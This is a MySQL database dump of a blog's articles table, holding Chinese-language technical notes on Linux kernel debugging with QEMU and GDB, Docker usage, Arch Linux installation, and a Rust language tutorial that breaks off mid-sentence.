-- MySQL dump 10.13  Distrib 8.3.0, for Linux (x86_64)
--
-- Host: localhost    Database: website
-- ------------------------------------------------------
-- Server version	8.3.0

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `articles`
--

create database website;
use website;

DROP TABLE IF EXISTS `articles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `articles` (
  `id` int NOT NULL AUTO_INCREMENT,
  `author` int NOT NULL,
  `title` varchar(256) NOT NULL,
  `content` longtext,
  `create` datetime NOT NULL,
  `update` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `author` (`author`),
  CONSTRAINT `articles_ibfk_1` FOREIGN KEY (`author`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=100068 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `articles`
--

LOCK TABLES `articles` WRITE;
/*!40000 ALTER TABLE `articles` DISABLE KEYS */;
INSERT INTO `articles` VALUES (100000,100000,'Debug Linux Kernel','## 常规调试linux kernel\r\n\r\n### 安装基本工具\r\n\r\n安装```gdb```和```qemu```\r\n\r\n### 下载linux源代码\r\n\r\n去https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/下下载linux-6.6源码并解压进入目录\r\n\r\n### 生成配置文件\r\n\r\n编译内核并设置保留编译信息\r\n\r\n```sh\r\n$ make menuconfig\r\n> Kernel hacking --->\r\n>> Compile-time checks and compiler options --->\r\n>>> Debug information (Rely on the toolchain ...)\r\n```\r\n\r\n关闭这个配置选项 ```# CONFIG_RANDOMIZE_BASE is not set``` 否则Debug断点断不住\r\n\r\n### 编译内核\r\n\r\n```sh\r\n$ make -j8\r\n```\r\n\r\n### 调试内核\r\n\r\n虚拟机运行```bzImage```\r\n\r\n```sh\r\n$ qemu-system-x86_64 -s -S -kernel arch/x86_64/boot/bzImage\r\n```\r\n\r\n开始Debug\r\n\r\n```sh\r\n$ gdb vmlinux\r\n> target remote localhost:1234\r\n> hb start_kernel\r\n> layout src\r\n> c\r\n```\r\n\r\n ## 配置VsCode调试linux kernel\r\n\r\n### 安装VsCode插件\r\n\r\n安装```GDB Debug```和```C/C++``` 插件\r\n\r\n### 配置\r\n\r\n在```.vscode```文件夹下新建```launch.json```文件\r\n\r\n```sh\r\n{\r\n    \"version\": \"0.2.0\",\r\n    \"configurations\": [\r\n        {\r\n            \"type\": \"cppdbg\",\r\n            \"request\": \"launch\",\r\n            \"name\": \"kernel debug\",\r\n            \"program\": \"${workspaceFolder}/vmlinux\",\r\n            \"cwd\": \"${workspaceFolder}\",\r\n            \"MIMode\": \"gdb\",\r\n            \"miDebuggerServerAddress\": \"localhost:1234\",\r\n            \"preLaunchTask\": \"启动QEMU\"\r\n        }\r\n    ]\r\n}\r\n```\r\n\r\n```tasks.json```文件\r\n\r\n```sh\r\n{\r\n    \"version\": \"2.0.0\",\r\n    \"tasks\": [\r\n        {\r\n            \"type\": \"shell\",\r\n            \"label\": \"启动QEMU\",\r\n            \"command\": \"qemu-system-x86_64\",\r\n            \"args\": [\r\n                \"-s\",\r\n                \"-S\",\r\n                \"-kernel\",\r\n                \"arch/x86_64/boot/bzImage\"\r\n            ],\r\n            \"isBackground\": true,\r\n        }\r\n    ]\r\n}\r\n```\r\n\r\n这样 点击```VsCode```的调试就会自动开启虚拟机 然后```VsCode```自己连接虚拟机并调试```linux kernel```\r\n\r\n### 解决VsCode报错\r\n\r\n在```.vscode```文件夹下新建```c_cpp_properties.json```文件\r\n\r\n```sh\r\n{\r\n    \"configurations\": [\r\n        {\r\n            \"name\": \"linux\",\r\n            \"includePath\": [\r\n                \"${workspaceFolder}\",\r\n                \"/home/linzui/Code/linux/linux-6.6/**\" \r\n            ]\r\n          \r\n        }\r\n    ],\r\n    \"version\": 4\r\n}\r\n```\r\n\r\n```includePath```填写```linux```源码文件位置\r\n\r\n```settings.json```文件\r\n\r\n```sh\r\n{\r\n    \"C_Cpp.intelliSenseEngineFallback\": \"disabled\",\r\n    \"C_Cpp.intelliSenseEngine\": \"Tag Parser\",\r\n    //以下内容可以不用\r\n    \"files.associations\": {\r\n        \"init.h\": \"c\",\r\n        \"rope\": \"c\",\r\n        \"ostream\": \"c\",\r\n        \"kernel.h\": \"c\",\r\n        \"algorithm\": \"c\",\r\n        \"of_gpio.h\": \"c\",\r\n        \"gpio.h\": \"c\",\r\n        \"module.h\": \"c\"\r\n    }\r\n}\r\n```\r\n\r\n点击启动调试便会自动调试```linux kernel```','2023-12-22 02:02:05','2023-12-22 02:02:05'),(100002,100000,'Docker 学习笔记','## docker\r\n\r\n### docker安装\r\n\r\n```sh\r\n$ sudo pacman -S docker docker-compose\r\n```\r\n\r\n### 常用命令\r\n\r\n- ```docker pull nginx```  从服务器拉取镜像\r\n\r\n- ```docker run nginx``` 创建容器\r\n- ```docker start nginx``` 开始运行容器\r\n- ```docker stop nginx``` 停止容器\r\n\r\n- ```docker ps  ``` 查看正在运行的容器\r\n- ```docker rm nginx``` 删除容器\r\n- ```docker images``` 查看本地镜像\r\n- ```docker rmi nginx``` 删除本地镜像\r\n\r\n### 运行docker容器\r\n\r\n#### 创建容器\r\n\r\n```sh\r\n$ docker run -d --name blog nginx\r\n```\r\n\r\n> -d 后台运行\r\n>\r\n> --name 指定进程名称\r\n\r\n#### 进入容器\r\n\r\n```sh\r\n$ docker exec -it blog bash\r\n```\r\n\r\n#### 绑定端口\r\n\r\n```sh\r\n$ docker run -d --name blog -p 8080:80 nginx\r\n```\r\n\r\n将宿主机8080端口绑定docker容器80端口\r\n\r\n#### 挂载目录\r\n\r\n```sh\r\ndocker run -d --name blog -p 8080:80 -v /home/linzui/blog:/opt/nginx/html nginx\r\n```\r\n\r\n### 构建镜像\r\n\r\n#### 编写基本配置文件dockerfile\r\n\r\n```sh\r\nFROM ubuntu\r\n\r\nWORKDIR \r\n\r\nRUN\r\n\r\nCMD\r\n```\r\n\r\n##### FROM\r\n\r\n基础镜像，必须是可以下载下来的,定制的镜像都是基于 FROM 的镜像，这里的ubuntu就是定制需要的基础镜像。后续的操作都是基于ubuntu镜像\r\n\r\n##### WORKDIR\r\n\r\n指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。\r\n\r\n##### RUN\r\n\r\n指定在当前镜像构建过程中要运行的命令\r\n\r\n##### CMD\r\n\r\n为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。\r\n\r\n#### 构建\r\n\r\n```sh\r\n$ docker build -t nginx:v1 .\r\n```\r\n\r\n> -t 指定镜像名称\r\n>\r\n> . 为在当前目录下寻找dockerfile文件','2023-12-22 13:31:23','2023-12-22 13:31:23'),(100003,100000,'ArchLinux安装命令','### 连接wifi\r\n\r\n```sh\r\niwctl \r\nstation wlan0 connect linzui\r\nexit\r\n```\r\n\r\n### 换源\r\n\r\n```sh\r\ncat > /etc/pacman.d/mirrorlist << \"EOF\"\r\nServer = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch\r\nEOF\r\n```\r\n\r\n### 分区\r\n\r\n```sh\r\ncfdisk /dev/nvme0n1\r\nmkfs.fat -F32 /dev/nvme0n1p1\r\nmkswap /dev/nvme0n1p2\r\nmkfs.ext4 /dev/nvme0n1p3\r\n```\r\n\r\n### 挂载分区\r\n\r\n```sh\r\nmount /dev/nvme0n1p3 /mnt\r\nswapon /dev/nvme0n1p2\r\nmkdir /mnt/boot\r\nmount /dev/nvme0n1p1 /mnt/boot\r\n```\r\n\r\n### 安装基本系统\r\n\r\n```sh\r\npacstrap /mnt base base-devel linux linux-firmware linux-headers vim intel-ucode networkmanager\r\n\r\ngenfstab -U /mnt >> /mnt/etc/fstab\r\narch-chroot /mnt\r\n```\r\n\r\n### 修改主机名\r\n\r\n```sh\r\necho \"LAPTOP-EV6AO0H2\" >> /etc/hostname\r\n\r\ncat > /etc/hosts << \"EOF\"\r\n127.0.0.1   localhost\r\n::1         localhost\r\n127.0.1.1   LAPTOP-EV6AO0H2.localdomain     LAPTOP-EV6AO0H2\r\nEOF\r\n```\r\n\r\n### 新建用户并设置密码\r\n\r\n```sh\r\npasswd\r\nuseradd -mG wheel linzui\r\npasswd linzui\r\nvisudo\r\n```\r\n\r\n### 安装引导程序\r\n\r\n```sh\r\nvim /etc/fstab\r\n\r\numount /boot\r\nmount /boot\r\n\r\nbootctl install\r\n```\r\n> vim /etc/fstab修改fmask=0137,dmask=0027\r\n\r\n### 引导程序基本设置\r\n\r\n```sh\r\ncat > /boot/loader/loader.conf << \"EOF\"\r\ndefault arch-*\r\nEOF\r\n\r\ncat > /boot/loader/entries/arch.conf << \"EOF\"\r\ntitle    Arch Linux\r\nlinux    /vmlinuz-linux\r\ninitrd    /intel-ucode.img\r\ninitrd    /initramfs-linux.img\r\noptions    root=/dev/nvme0n1p3 rw quiet loglevel=3 rd.udev.log_level=3 systemd.show_status=auto vt.global_cursor_default=0 i915.fastboot=1\r\nEOF\r\n```\r\n\r\n### 启用网络\r\n\r\n```sh\r\nsystemctl enable NetworkManager\r\n```\r\n\r\n### 重启进入系统\r\n\r\n```sh\r\nexit\r\numount -a\r\nreboot\r\n```\r\n\r\n### 安装基本kde环境\r\n\r\n```sh\r\nsudo pacman -S wayland plasma sddm plasma-wayland-session\r\nsudo systemctl enable sddm\r\nsudo pacman -S ark kfind kcalc spectacle kate gwenview kamoso konsole dolphin\r\nsudo pacman -S sof-firmware\r\n```\r\n\r\n### 安装基本Gnome环境\r\n\r\n```sh\r\nsudo pacman -S gnome\r\nsudo pacman -S pipewire-pulse pipewire\r\nsudo pacman -S sof-firmware\r\nsystemctl enable pipewire-pulse --user\r\nsystemctl enable pipewire --user\r\n```\r\n\r\n\r\n### 安装paru clash\r\n\r\n```sh\r\n\r\n```\r\n\r\n### 小设置\r\n\r\n```sh\r\nvim /etc/mkinitcpio.conf \r\n\r\nparu -S upd72020x-fw ast-firmware aic94xx-firmware wd719x-firmware\r\nsudo pacman -S linux-firmware-qlogic\r\n\r\nsudo mkinitcpio -P\r\nsudo bootctl update\r\n```\r\n> vim /etc/mkinitcpio.conf 修改udev->systemd\r\n\r\n### 安装中文输入法\r\n\r\n```sh\r\nsudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-im fcitx5-configtool fcitx5-qt fcitx5-gtk fcitx5-lua\r\n\r\nsu root\r\ncat > /etc/environment << \"EOF\"\r\nGTK_IM_MODULE=fcitx\r\nQT_IM_MODULE=fcitx\r\nXMODIFIERS=@im=fcitx\r\nEOF\r\n```\r\n\r\n### 安装蓝牙\r\n\r\n```sh\r\nsudo pacman -S bluez bluez-utils pulseaudio-bluetooth\r\nsudo systemctl enable bluetooth.service\r\n```\r\n\r\n### 安装常用软件\r\n#### browser\r\n\r\n```shell\r\nparu -S google-chrome microsoft-edge-stable-bin\r\n```\r\n\r\n#### fonts\r\n\r\n```shell\r\nsudo pacman -S ttf-jetbrains-mono noto-fonts noto-fonts-cjk noto-fonts-emoji noto-fonts-extra\r\n```\r\n\r\n#### wps\r\n\r\n``` shell\r\nparu -S wps-office ttf-wps-fonts wps-office-mui-zh-cn libtiff5\r\n```\r\n\r\n#### code\r\n\r\n``` shell\r\nsudo pacman -S jdk17-openjdk python rust\r\n\r\nparu -S intellij-idea-ultimate-edition pycharm-professional visual-studio-code-bin\r\n```\r\n\r\n#### qq\r\n\r\n```shell\r\nparu -S linuxqq qqmusic-electron\r\n```\r\n\r\n#### minecraft\r\n\r\n```shell\r\nparu -S minecraft-launcher\r\n```\r\n\r\n','2023-12-22 23:56:57','2024-03-12 16:55:51'),(100006,100000,'Rust 圣经','# 1. 入门指南\r\n\r\n## 1.1 安装\r\n\r\n### 在Arch Linux上安装rust\r\n\r\n`$ sudo pacman -S rust`\r\n\r\n## 1.2 Hello World\r\n\r\n### 编写和运行Rust程序\r\n\r\n`$ vim main.rs`\r\n\r\n```rust\r\nfn main() {\r\n	println!(\"Hello World\")\r\n}\r\n```\r\n\r\n`$ rustc main.rs`\r\n\r\n## 1.3 Hello Cargo\r\n\r\n### 使用Cargo创建项目\r\n\r\n`$ cargo new hello_cargo`\r\n\r\n`$ cd hello_cargo`\r\n\r\n### 构建并运行Cargo项目\r\n\r\n`$ cargo run`	\r\n\r\n# 2. [猜数字游戏](https://rustwiki.org/zh-CN/book/ch02-00-guessing-game-tutorial.html)\r\n\r\n# 3. 通用编程概念\r\n\r\n## 3.1 变量和可变性\r\n\r\n### 不可变变量与可变变量\r\n\r\n```rust\r\nfn main() {\r\n    let x = 5;\r\n    let mut y = 10;\r\n}\r\n```\r\n\r\n### 常量\r\n\r\n`const THREE_HOURS_IN_SECONDS: u32 = 60 * 60 * 3`\r\n\r\n### 遮蔽\r\n\r\n```rust\r\nfn main() {\r\n    let x = 5;\r\n    let x = x + 1;\r\n    {\r\n        let x = x * 3;\r\n        println!(\"The value of x is: {}\", x);\r\n    }\r\n    println!(\"The value of x is: {}\", x)\r\n}\r\n```\r\n\r\n## 3.2 数据类型\r\n\r\n### 整形\r\n\r\n| 长度   | 有符号类型 | 无符号类型 |\r\n| ------ | ---------- | ---------- |\r\n| 8 位   | `i8`       | `u8`       |\r\n| 16 位  | `i16`      | `u16`      |\r\n| 32 位  | `i32`      | `u32`      |\r\n| 64 位  | `i64`      | `u64`      |\r\n| 128 位 | `i128`     | `u128`     |\r\n| arch   | `isize`    | `usize`    |\r\n\r\n`isize` 和 `usize` 类型取决于程序运行的计算机体系结构，在表中表示为“arch”：若使用 64 位架构系统则为 64 位，若使用 32 位架构系统则为 32 位。\r\n\r\n### 浮点\r\n\r\nRust 的浮点型是`f32`和`f64`，大小分别为32位和64位。默认是64位，因为在现代的 CPU 中它的速度与 `f32` 的几乎相同，但精度更高。所有浮点型都是有符号的。\r\n\r\n```fust\r\nfn main() {\r\n	let x = 2.0        //f64\r\n	ley y: f32 = 3.0   //f32\r\n}\r\n```\r\n\r\n### 数字运算\r\n\r\n```rust\r\nfn main() {\r\n    //addition\r\n    let sum = 5 + 10;\r\n    \r\n    //subtraction\r\n    let difference = 95.5 - 4.3;\r\n    \r\n    //multiplication\r\n    let product = 4 * 30;\r\n    \r\n    //division\r\n    let quotient = 56.7 / 32.2;\r\n    let floored = 2 / 3; //Results in 0\r\n    \r\n    //remainder\r\n    let remainder = 43 % 5;\r\n}\r\n```\r\n\r\n### 布尔类型\r\n\r\n```rust\r\nfn main() {\r\n    let t = true;\r\n    let f: bool = false;\r\n}\r\n```\r\n\r\n### 字符类型\r\n\r\nRust 的 `char`(字符)类型是该语言最基本的字母类型。\r\n\r\n```rust\r\nfn main() {\r\n    let c = \'z\';\r\n}\r\n```\r\n\r\n### 元组类型\r\n\r\n```rust\r\nfn main() {\r\n    let tup: (i32, f64, u8) = (500, 6.4, 1);\r\n    //使用模式匹配来解构(destructure)元组的值\r\n    let (x, y, z) = tup;  \r\n}\r\n```\r\n\r\n除了通过模式匹配进行解构外，我们还可以使用一个句点（`.`）连上要访问的值的索引来直接访问元组元素。\r\n\r\n`let x = tup.0;` \r\n\r\n### 数组类型\r\n\r\n```rust\r\nfn main() {\r\n    let a: [i32; 5] = [1, 2, 3, 4, 5];\r\n}\r\n```\r\n\r\n如果要为每个元素创建包含相同值的数组，可以指定初始值，后跟分号，然后在方括号中指定数组的长度。\r\n\r\n`let a = [3; 5];`\r\n\r\n数组是可以在栈上分配的已知固定大小的单个内存块。可以使用索引访问数组的元素。\r\n\r\n```rust\r\nfn main() {\r\n    let a = [1, 2, 3, 4, 5];\r\n    \r\n    let first = a[0];\r\n    let second = a[1];\r\n}\r\n```\r\n\r\n## 3.3 函数\r\n\r\n### 定义\r\n\r\nRust 代码中的函数和变量名使用下划线命名法（*snake case*，直译为蛇形命名法）规范风格。在下划线命名法中，所有字母都是小写并使用下划线分隔单词。这是一个包含函数定义示例的程序：\r\n\r\n```rust\r\nfn main() {\r\n    println!(\"Hello, world!\");\r\n\r\n    another_function();\r\n}\r\n\r\nfn another_function() {\r\n    println!(\"Another function.\");\r\n}\r\n```\r\n\r\n### 参数\r\n\r\n```rust\r\nfn main() {\r\n    another_function(5);\r\n}\r\n\r\nfn another_function(x: i32) {\r\n    println!(\"The value of x is: {}\", x);\r\n}\r\n```\r\n\r\n在函数签名中，**必须**声明每个参数的类型。这是一个 Rust 设计中经过慎重考虑的决定：要求在函数定义中提供类型标注，意味着编译器几乎从不需要你在代码的其他地方注明类型来指出你的意图。\r\n\r\n### 带返回值的函数\r\n\r\n函数可以向调用它的代码返回值。我们并不对返回值命名，但要在箭头（`->`）后声明它的类型。在 Rust 中，函数的返回值等同于函数体最后一个表达式的值。使用 `return` 关键字和指定值，可以从函数中提前返回；但大部分函数隐式返回最后一个表达式。\r\n\r\n```rust\r\nfn five() -> i32 {\r\n    5\r\n}\r\n\r\nfn main() {\r\n    let x = five();\r\n\r\n    println!(\"The value of x is: {}\", x);\r\n}\r\n```\r\n\r\n## 3.4 注释\r\n\r\n这是一条简单的注释：\r\n\r\n`// Hello, world.`\r\n\r\n在 Rust 中，惯用的注释形式以两个斜杆开头，直到该行尾结束。对于超出单行的注释，需要在每行的行首加上 `//`，如下所示：\r\n\r\n```rust\r\n// 我们在这里处理一些复杂事情，需要足够长的解释，使用\r\n// 多行注释可做到这点。哇！我们希望这个注释将解释接下\r\n// 来要实现的内容。\r\n```\r\n\r\nRust 还具有另一种注释，即**文档注释**，我们将在第 14 章进行讨论。\r\n\r\n## 3.5 控制流\r\n\r\n### if表达式\r\n\r\n```rust\r\nfn main() {\r\n    let number = 3;\r\n\r\n    if number < 5 {\r\n        println!(\"condition was true\");\r\n    } else {\r\n        println!(\"condition was false\");\r\n    }\r\n}\r\n```\r\n\r\n### 使用 `else if` 处理多重条件\r\n\r\n```rust\r\nfn main() {\r\n    let number = 6;\r\n\r\n    if number % 4 == 0 {\r\n        println!(\"number is divisible by 4\");\r\n    } else if number % 3 == 0 {\r\n        println!(\"number is divisible by 3\");\r\n    } else if number % 2 == 0 {\r\n        println!(\"number is divisible by 2\");\r\n    } else {\r\n        println!(\"number is not divisible by 4, 3, or 2\");\r\n    }\r\n}\r\n```\r\n\r\n### 在 `let` 语句中使用 `if`\r\n\r\n```rust\r\nfn main() {\r\n    let condition = true;\r\n    let number = if condition { 5 } else { 6 };\r\n\r\n    println!(\"The value of number is: {}\", number);\r\n}\r\n```\r\n\r\n### 使用 `loop` 重复执行代码并返回值\r\n\r\n```rust\r\nfn main() {\r\n    let mut counter = 0;\r\n\r\n    let result = loop {\r\n        counter += 1;\r\n\r\n        if counter == 10 {\r\n            break counter * 2;\r\n        }\r\n    };\r\n\r\n    println!(\"The result is {}\", result);\r\n}\r\n```\r\n\r\n### `while` 条件循环\r\n\r\n```rust\r\nfn main() {\r\n    let mut number = 3;\r\n\r\n    while number != 0 {\r\n        println!(\"{}!\", number);\r\n\r\n        number -= 1;\r\n    }\r\n\r\n    println!(\"LIFTOFF!!!\");\r\n}\r\n```\r\n\r\n### 使用 `for` 遍历集合\r\n\r\n```rust\r\nfn main() {\r\n    let a = [10, 20, 30, 40, 50];\r\n    let mut index = 0;\r\n\r\n    while index < 5 {\r\n        println!(\"the value is: {}\", a[index]);\r\n\r\n        index += 1;\r\n    }\r\n}\r\n```\r\n\r\n# 4. 认识所有权\r\n\r\n## 4.1 什么是所有权\r\n\r\n### 所有权规则\r\n\r\n- Rust中的每一个值都有一个被称为其 **所有者**（*owner*）的变量。\r\n- 值在任一时刻有且只有一个所有者。\r\n- 当所有者（变量）离开作用域，这个值将被丢弃。\r\n\r\n### 变量作用域\r\n\r\n在所有权的第一个例子中，我们看看一些变量的 **作用域**（*scope*）。作用域是一个项（item）在程序中有效的范围。\r\n\r\n```rust\r\n 	{                      // s 在这里无效, 它尚未声明\r\n        let s = \"hello\";   // 从此处起，s 开始有效\r\n\r\n        // 使用 s\r\n    }   				   // 此作用域已结束，s 不再有效\r\n```\r\n\r\n### `String` 类型\r\n\r\n`String`类型管理被分配到**堆**上的数据，所以能够存储在编译时未知大小的文本。\r\n\r\n```rust\r\n	let mut s = String::from(\"hello\");\r\n\r\n    s.push_str(\", world!\"); // push_str() 在字符串后追加字面值\r\n\r\n    println!(\"{}\", s); // 将打印 `hello, world!`\r\n```\r\n\r\n### 移动\r\n\r\n```rust\r\n	let s1 = String::from(\"hello\");\r\n	//s1的所有权移动到s2上，s1不可使用\r\n    let s2 = s1;\r\n```\r\n\r\n### 克隆\r\n\r\n```rust\r\n	let s1 = String::from(\"hello\");\r\n    let s2 = s1.clone();\r\n\r\n    println!(\"s1 = {}, s2 = {}\", s1, s2);\r\n```\r\n\r\n### 拷贝\r\n\r\n像整型这样的在编译时已知大小的类型被整个存储在**栈**上。\r\n\r\n```rust\r\n    let x = 5;\r\n    let y = x;\r\n\r\n    println!(\"x = {}, y = {}\", x, y);\r\n```\r\n\r\n### 所有权与函数\r\n\r\n将值传递给函数在语义上与给变量赋值相似。向函数传递值可能会移动或者复制。\r\n\r\n```rust\r\nfn main() {\r\n  let s = String::from(\"hello\");  // s 进入作用域\r\n\r\n  takes_ownership(s);             // s 的值移动到函数里 ...\r\n                                  // ... 所以到这里不再有效\r\n\r\n  let x = 5;                      // x 进入作用域\r\n\r\n  makes_copy(x);                  // x 应该移动函数里，\r\n                                  // 但 i32 是 Copy 的，所以在后面可继续使用 x\r\n\r\n} // 这里, x 先移出了作用域，然后是 s。但因为 s 的值已被移走，\r\n  // 所以不会有特殊操作\r\n\r\nfn takes_ownership(some_string: String) { // some_string 进入作用域\r\n  println!(\"{}\", some_string);\r\n} // 这里，some_string 移出作用域并调用 `drop` 方法。占用的内存被释放\r\n\r\nfn makes_copy(some_integer: i32) { // some_integer 进入作用域\r\n  println!(\"{}\", some_integer);\r\n} // 这里，some_integer 移出作用域。不会有特殊操作\r\n```\r\n\r\n### 返回值与作用域\r\n\r\n返回值也可以转移所有权。\r\n\r\n```rust\r\nfn main() {\r\n  let s1 = gives_ownership();         // gives_ownership 将返回值\r\n                                      // 移给 s1\r\n\r\n  let s2 = String::from(\"hello\");     // s2 进入作用域\r\n\r\n  let s3 = takes_and_gives_back(s2);  // s2 被移动到\r\n                                      // takes_and_gives_back 中,\r\n                                      // 它也将返回值移给 s3\r\n} // 这里, s3 移出作用域并被丢弃。s2 也移出作用域，但已被移走，\r\n  // 所以什么也不会发生。s1 移出作用域并被丢弃\r\n\r\nfn gives_ownership() -> String {           // gives_ownership 将返回值移动给\r\n                                           // 调用它的函数\r\n\r\n  let some_string = String::from(\"yours\"); // some_string 进入作用域\r\n\r\n  some_string                              // 返回 some_string 并移出给调用的函数\r\n}\r\n\r\n// takes_and_gives_back 将传入字符串并返回该值\r\nfn takes_and_gives_back(a_string: String) -> String { // a_string 进入作用域\r\n\r\n  a_string  // 返回 a_string 并移出给调用的函数\r\n}\r\n```\r\n\r\n## 4.2 引用与借用\r\n\r\n### 不可变引用\r\n\r\n```rust\r\nfn main() {\r\n    let s1 = String::from(\"hello\");\r\n\r\n    let len = calculate_length(&s1);\r\n\r\n    println!(\"The length of \'{}\' is {}.\", s1, len);\r\n}\r\n\r\nfn calculate_length(s: &String) -> usize {\r\n    s.len()\r\n}\r\n```\r\n\r\n 这些 & 符号就是 **引用**，它们允许你使用值但不获取其所有权。\r\n\r\n![图片](https://rustwiki.org/zh-CN/book/img/trpl04-05.svg)\r\n\r\n注意：与使用 `&` 引用相反的操作是 **解引用**（*dereferencing*），它使用解引用运算符，`*`。\r\n\r\n### 可变引用\r\n\r\n```rust\r\nfn main() {\r\n    let mut s = String::from(\"hello\");\r\n\r\n    change(&mut s);\r\n}\r\n\r\nfn change(some_string: &mut String) {\r\n    some_string.push_str(\", world\");\r\n}\r\n```\r\n\r\n可变引用有一个很大的限制：在同一时间，只能有一个对某一特定数据的可变引用。尝试创建两个可变引用的代码将会失败。\r\n\r\n这个限制的好处是 Rust 可以在编译时就避免数据竞争。**数据竞争**（*data race*）类似于竞态条件，它由这三个行为造成：\r\n\r\n- 两个或更多指针同时访问同一数据。\r\n- 至少有一个指针被用来写入数据。\r\n\r\n- 没有同步数据访问的机制。\r\n\r\n### 悬垂引用(Dangling References)\r\n\r\n在具有指针的语言中，很容易通过释放内存时保留指向它的指针而错误地生成一个 **悬垂指针**（*dangling pointer*），所谓悬垂指针是其指向的内存可能已经被分配给其它持有者。相比之下，在 Rust 中编译器确保引用永远也不会变成悬垂状态：当你拥有一些数据的引用，编译器确保数据不会在其引用之前离开作用域。\r\n\r\n### 引用的规则\r\n\r\n- 在任意给定时间，**要么** 只能有一个可变引用，**要么** 只能有多个不可变引用。\r\n- 引用必须总是有效的。\r\n\r\n## 4.3 切片 slice\r\n\r\n### 字符串 slice\r\n\r\n**字符串 slice**（*string slice*）是 `String` 中一部分值的引用。\r\n\r\n```rust\r\n	let s = String::from(\"hello world\");\r\n\r\n    let hello = &s[0..5];\r\n    let world = &s[6..11];\r\n```\r\n\r\n这类似于引用整个 `String` 不过带有额外的 `[0..5]` 部分。它不是对整个 `String` 的引用，而是对部分 `String` 的引用。\r\n\r\n### 字符串 slice 作为函数参数与返回值\r\n\r\n`fn first_word(s: &String) -> &str`\r\n\r\n`fn first_word(s: &str) -> &str `\r\n\r\n### 其他类型的 slice\r\n\r\n```rust\r\nlet a = [1, 2, 3, 4, 5];\r\n\r\nlet slice = &a[1..3];\r\n```\r\n\r\n### 总结\r\n\r\n所有权、借用和 slice 这些概念让 Rust 程序在编译时确保**内存安全**。Rust 语言提供了跟其他系统编程语言相同的方式来控制你使用的内存，但拥有数据所有者在离开作用域后自动清除其数据的功能意味着你无须额外编写和调试相关的控制代码。\r\n\r\n所有权系统影响了 Rust 中很多其他部分的工作方式，所以我们还会继续讲到这些概念，这将贯穿本书的余下内容。\r\n\r\n# 5. 使用结构体组织关联数据\r\n\r\n## 5.1 定义和举例说明结构体\r\n\r\n### 定义并实例化结构体\r\n\r\n定义结构体，需要使用 `struct` 关键字并为整个结构体提供一个名字。\r\n\r\n```rust\r\nstruct User {\r\n    active: bool,\r\n    username: String,\r\n    email: String,\r\n    sign_in_count: u64,\r\n}\r\nfn main() {\r\n    let user1 = User {\r\n        email: String::from(\"someone@example.com\"),\r\n        username: String::from(\"someusername123\"),\r\n        active: true,\r\n        sign_in_count: 1,\r\n    };\r\n}\r\n```\r\n\r\n### 元组结构体\r\n\r\n要定义元组结构体，以 `struct` 关键字和结构体名开头并后跟元组中的类型。\r\n\r\n```rust\r\nstruct Color(i32, i32, i32);\r\nstruct Point(i32, i32, i32);\r\n\r\nfn main() {\r\n    let black = Color(0, 0, 0);\r\n    let origin = Point(0, 0, 0);\r\n}\r\n```\r\n\r\n### 类单元结构体\r\n\r\n类单元结构体常常在你想要在某个类型上实现 trait 但不需要在类型中存储数据的时候发挥作用。\r\n\r\n```rust\r\nstruct AlwaysEqual;\r\n\r\nfn main() {\r\n    let subject = AlwaysEqual;\r\n}\r\n```\r\n\r\n## 5.2 使用结构体的代码例子\r\n\r\n[代码例子](https://rustwiki.org/zh-CN/book/ch05-02-example-structs.html)\r\n\r\n## 5.3 方法语法\r\n\r\n### 定义方法\r\n\r\n```rust\r\nstruct Rectangle {\r\n    width: u32,\r\n    height: u32,\r\n}\r\n\r\nimpl Rectangle {\r\n    fn area(&self) -> u32 {\r\n        self.width * self.height\r\n    }\r\n}\r\n```\r\n\r\n### 关联函数\r\n\r\n所有在 `impl` 块中定义的函数被称为**关联函数**（*associated function*），因为它们与 `impl` 后面命名的类型相关。我们可以定义不以 `self` 为第一参数的关联函数（因此不是方法），因为它们并不作用于一个结构体的实例。\r\n\r\n```rust\r\nimpl Rectangle {\r\n    fn square(size: u32) -> Rectangle {\r\n        Rectangle {\r\n            width: size,\r\n            height: size,\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n# 6. 枚举和模式匹配\r\n\r\n## 6.1 定义枚举\r\n\r\n### 定义\r\n\r\n可以通过在代码中定义一个 `IpAddrKind` 枚举来表现这个概念并列出可能的 IP 地址类型，`V4` 和 `V6`。这被称为枚举的 **成员**（*variants*）：\r\n\r\n```rust\r\nenum IpAddrKind {\r\n    V4,\r\n    V6,\r\n}\r\n```\r\n\r\n### 枚举值\r\n\r\n可以像这样创建 `IpAddrKind` 两个不同成员的实例：\r\n\r\n```rust\r\nlet four = IpAddrKind::V4;\r\nlet six = IpAddrKind::V6;\r\n```\r\n\r\n### `Option` 枚举和其相对于空值的优势\r\n\r\n编程语言的设计经常要考虑包含哪些功能，但考虑排除哪些功能也很重要。Rust 并**没有**很多其他语言中有的空值功能。**空值**（*Null* ）是一个值，它代表没有值。在有空值的语言中，变量总是这两种状态之一：空值和非空值。\r\n\r\nRust 